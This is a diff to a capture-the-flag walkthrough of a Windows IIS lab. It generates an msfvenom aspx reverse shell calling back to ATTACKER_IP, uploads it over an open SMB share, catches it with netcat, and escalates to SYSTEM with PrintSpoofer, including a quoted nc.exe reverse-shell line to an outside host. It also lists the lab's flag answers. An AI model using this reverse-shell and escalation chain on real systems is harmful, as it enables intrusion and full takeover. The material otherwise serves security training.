@@ -258,21 +258,25 @@ msf > use exploit/windows/smb/ms17_010_eternalblue
 ...
 set LHOST,RHOST,LPORT then run
 ...
-[*] 10.49.167.151:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
-[-] 10.49.167.151:445     - Rex::ConnectionTimeout: The connection with (10.49.167.151:445) timed out.
-[*] 10.49.167.151:445     - Scanned 1 of 1 hosts (100% complete)
-[-] 10.49.167.151:445 - The target is not vulnerable.
+[*] THM_Target:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[-] THM_Target:445     - Rex::ConnectionTimeout: The connection with (THM_Target:445) timed out.
+[*] THM_Target:445     - Scanned 1 of 1 hosts (100% complete)
+[-] THM_Target:445 - The target is not vulnerable.
 [*] Exploit completed, but no session was created.
 ```
 So skip that, but SMB is clearly able to access a share so with msfvenom there are exploit options with or without meterpreter:
 
 Without meterpreter:
-- start a netcat listener
-- create msfvenom exploit windows/x64/shell_reverse_tcp
+- Start a netcat listener
+- Create msfvenom exploit windows/x64/shell_reverse_tcp
+- Inspection of the website it shows x-powered-by asp.net so aspx format is used for exploit, this is common for IIS server to support it, look for anything indicating asp.net, IIS, Microsoft-IIS/x.x or .NET Framework, which indicate web server is running ASP.NET.
+  
 ```
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f aspx > exploit.aspx
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -a x64 --platform windows -f aspx > exploit.aspx
 ```
+
 - use smb as before but use put command to upload the exploit:
+
 ```
 ~# smbclient \\\\THM_Target\\nt4wrksv
 Password for [WORKGROUP\root]:
@@ -281,6 +285,7 @@ smb: \> put exploit.aspx
 putting file exploit.aspx as \exploit.aspx (551.4 kb/s) (average 551.4 kb/s)
 ```
 - Then access it from the browswer with http://THM_Target:49663/nt4wrksv/exploit.aspx and should link to netcat:
+
 ```
 ~# nc -lnvp 4444
 Listening on 0.0.0.0 4444
@@ -293,6 +298,11 @@ iis apppool\defaultapppool
 c:\windows\system32\inetsrv> cd \Users\Bob\Desktop
 c:\Users\Bob\Desktop>type user.txt
 THM{fdk4ka34vk346ksxfr21tg789ktf45}
+```
+Answer Q1: User flag is THM{fdk4ka34vk346ksxfr21tg789ktf45}, from simple directory traversal.
+
+### See privileges of current user:
+```
 c:\Users\Bob\Desktop>whoami /priv
 
 PRIVILEGES INFORMATION
@@ -308,7 +318,9 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 SeCreateGlobalPrivilege       Create global objects                     Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 ```
-Answer Q1: User flag is THM{fdk4ka34vk346ksxfr21tg789ktf45}, from simple directory traversal.
+
+Impersonation Privileges
+- SeAssignPrimaryToken or SeImpersonate privilege, these two allow you to run code or even create a new process in the context of another user. To do so, you can call CreateProcessWithToken() if you have SeImpersonatePrivilege or CreateProcessAsUser() if you have SeAssignPrimaryTokenPrivilege.
 
 From whoami /priv it appears the SeImpersonatePrivilege is enabled and is useful for excalation:
 
@@ -336,7 +348,106 @@ Examples:
   - Get a SYSTEM reverse shell
       PrintSpoofer.exe -c "c:\Temp\nc.exe 10.10.13.37 1337 -e cmd"
 
-The other option using metasploit, start a exploit/multi/handler to listen for meterpreter, upload a exploit using a msfvenom exploit with payload windows/x64/meterpreter/reverse_tcp, then run the exploit in browser from the folder on port 49663 connection.
+    Here the first option is one I used successfully can use either powershell.exe or cmd.exe
+
+### Using PrintSpoofer
+- Start by uploading to the folder with smbclient
+- Start the netcat listener
+- Connect with previous exploit from msfvenom
+- Then run PrintSpoofer64.exe -i -c cmd.exe or with powershell.exe
+- Check user
+- Find root.txt file
+
+```
+└─$ smbclient \\\\THM_Target\\nt4wrksv
+...
+smb: \> put PrintSpoofer64.exe
+putting file PrintSpoofer64.exe as \PrintSpoofer64.exe (15.8 kB/s) (average 15.8 kB/s)
+smb: \> ls
+  .                                   D        0  Mon May 18 03:16:01 2026
+  ..                                  D        0  Mon May 18 03:16:01 2026
+  exploit.aspx                        A     3407  Mon May 18 03:14:53 2026
+  passwords.txt                       A       98  Sun Jul 26 01:15:33 2020
+  PrintSpoofer64.exe                  A    27136  Mon May 18 03:15:53 2026
+...
+# Next netcat listener
+...                                                                             
+└─$ nc -lnvp 4444   
+...
+c:\windows\system32\inetsrv>whoami
+iis apppool\defaultapppool
+...
+c:\windows\system32\inetsrv>cd /inetpub/wwwroot/nt4wrksv
+
+c:\inetpub\wwwroot\nt4wrksv>dir
+...
+05/17/2026  10:14 AM             3,407 exploit.aspx
+07/25/2020  08:15 AM                98 passwords.txt
+05/17/2026  10:15 AM            27,136 PrintSpoofer64.exe
+               3 File(s)         52,657 bytes
+               2 Dir(s)  20,063,768,576 bytes free
+
+c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c cmd.exe
+PrintSpoofer64.exe -i -c cmd.exe
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+Equally powershell would work here:
+```
+C:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c powershell.exe
+PrintSpoofer64.exe -i -c powershell.exe
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Windows PowerShell 
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> ^C
+```
+Back to getting root.txt:
+```
+C:\Windows\system32>cd \Users\Administrator\desktop
+C:\Users\Administrator\Desktop>dir
+...
+07/25/2020  08:24 AM    <DIR>          .
+07/25/2020  08:24 AM    <DIR>          ..
+07/25/2020  08:25 AM                35 root.txt
+...
+C:\Users\Administrator\Desktop>type root.txt
+THM{1fk5kf469devly1gl320zafgl345pv}
+```
+Answer Q2: root flag is THM{1fk5kf469devly1gl320zafgl345pv}
+
+Other option spawning system on another session would not have worked with no privileged account running in qwinsta check. Requiring a logged in user:
+
+```
+C:\inetpub\wwwroot\nt4wrksv>qwinsta
+qwinsta
+ SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE 
+>services                                    0  Disc                        
+ console                                     1  Conn                        
+ rdp-tcp                                 65536  Listen                      
+```
+
+There is no logged‑in user
+- console session has no username
+- services is a background session
+- rdp-tcp is only listening, not active
+- There is no interactive desktop session
+- No one is logged in via RDP or console.
+
+## Using metasploit instead of following the expectations of module:
+
+The other option using metasploit: 
+- Start a exploit/multi/handler to listen for meterpreter, set LHOST,RHOST,LPORT then run
+- Upload a exploit using a msfvenom exploit with payload windows/x64/meterpreter/reverse_tcp, then run the exploit in browser from the folder on port 49663 connection in same way as before.
 
 Meterpreter results:
 ```
@@ -347,7 +458,11 @@ c:\Users\Bob\Desktop>type user.txt
 THM{fdk4ka34vk346ksxfr21tg789ktf45}
 c:\Users\Bob\Desktop>exit
 ```
-# ESCALATE
+## Escalation a lot easier
+
+- Use 'shell' for cmd.exe
+- Or for powershell run both 'load powershell' and 'with powershell_shell'
+
 ```
 meterpreter > getsystem
 ...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
